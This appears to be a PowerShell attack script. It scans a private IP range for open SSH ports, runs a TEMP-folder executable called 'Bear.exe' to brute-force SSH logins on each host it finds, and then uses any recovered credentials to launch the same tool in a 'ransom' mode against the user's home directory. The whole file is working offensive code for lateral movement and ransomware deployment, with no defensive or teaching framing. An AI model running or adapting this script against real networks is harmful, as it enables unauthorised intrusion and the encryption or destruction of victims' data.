 function Expand-IPRange {
    param ($range)
    $start, $end = $range -split '-'
    $startIP = [System.Net.IPAddress]::Parse($start).GetAddressBytes()
    $endIP = [System.Net.IPAddress]::Parse($end).GetAddressBytes()
    [Array]::Reverse($startIP)
    [Array]::Reverse($endIP)
    $startInt = [BitConverter]::ToUInt32($startIP, 0)
    $endInt = [BitConverter]::ToUInt32($endIP, 0)

    $ips = @()
    for ($i = $startInt; $i -le $endInt; $i++) {
        $bytes = [BitConverter]::GetBytes($i)
        [Array]::Reverse($bytes)
        $ips += [System.Net.IPAddress]::new($bytes)
    }
    return $ips
}

function Expand-Ports {
    param ($portInput)
    $ports = @()
    foreach ($p in $portInput -split ',') {
        if ($p -match '-') {
            $range = $p -split '-'
            $ports += ($range[0]..$range[1])
        } else {
            $ports += [int]$p
        }
    }
    return $ports
}

function pscan {
    param (
        [Parameter(Mandatory = $true)][string]$t,
        [Parameter(Mandatory = $true)][string]$p
    )
    if ($t -match "-") {
        $hosts = Expand-IPRange -range $t
    } else {
        $hosts = @($t)
    }

    $ports = Expand-Ports -portInput $p

    foreach ($h in $hosts) {
        foreach ($port in $ports) {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $conn = $tcp.ConnectAsync($h, $port)

            for ($i = 0; $i -lt 10; $i++) {
                if ($conn.IsCompleted) { break }
                Start-Sleep -Milliseconds 1
            }
            $tcp.Close()

            if ($conn.Status -eq "RanToCompletion") {
                # Remove Later
                $status = "Open"
                $color = "Green"
                $hostPart = "{0,-15} tcp/{1,-5} - " -f $h, $port
                $ip_only = "{0,-15}" -f $h
                Write-Host "$hostPart$status" -ForegroundColor $color

                # Insert bruteforce SSH here. aka run AnonBear with ssh_bf flag
                #Start-Process -FilePath AnonBear.exe -ArgumentList [remote, $h, x:x, ssh_bf]
                $exePath = "$env:TEMP\Bear.exe"
                
                $tempFile = [System.IO.Path]::GetTempFileName()
                Start-Process -FilePath $exePath `
                -ArgumentList "remote", $ip_only, "x:x", "ssh_bf" `
                -NoNewWindow -Wait `
                -RedirectStandardOutput $tempFile

                # Read the last line of output
                $cred = Get-Content $tempFile | Select-Object -Last 1
                Remove-Item $tempFile
                Write-Host "Last line: $cred"
                
                # Write-Host $exePath remote $ip_only x:x ssh_bf
                # $cred = & $exePath remote $ip_only x:x ssh_bf
                # $cred = $cred[-1]
                if ($cred -eq "----------"){
                    Write-Host "Credential Not Good"
                    continue
                }
                $parts = $cred -split ":", 2  # Split into two parts only
                $usern = $parts[0].Trim()

                # Found, use Anonbear for remote ransomware

                Start-Process -FilePath $exePath `
                -ArgumentList "remote", $ip_only, $cred, "ransom", "/home/$usern/" `
                -NoNewWindow -Wait `
                -RedirectStandardOutput $tempFile

                # $output = & $exePath remote $ip_only $cred ransom "/home/$usern/"
                Write-Host "$ip_only Ransomed" -ForegroundColor $color
                $res = Get-Content $tempFile
                Remove-Item $tempFile
                Write-Host "Result: $res"
            }
        }
    }
}

$filePath1 = "$env:TEMP\schedule1.txt"
$filePath2 = "$env:TEMP\schedule2.txt"

if (!(Test-Path $filePath1)) {
    Write-Host "Please Prepare credentials for BF"
    exit
}

if (!(Test-Path $filePath2)) {
    Write-Host "Please Prepare credentials for BF"
    exit
}

pscan -t "172.16.8.0-172.16.8.100" -p "22"
